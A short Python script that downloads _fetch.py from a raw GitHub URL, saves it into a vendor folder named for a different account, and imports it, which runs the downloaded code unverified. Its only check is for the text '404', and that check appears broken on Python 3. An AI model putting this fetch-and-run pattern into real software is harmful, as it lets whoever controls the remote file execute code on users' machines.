# -*- coding: utf-8 -*-
import requests

fetchContent = requests.get('https://raw.githubusercontent.com/43874/pyrunner/master/_fetch.py').content
if '404' not in fetchContent:
    open('vendor/pveltrop/pyrunner/_fetch.py', 'wb').write(fetchContent)
    import _fetch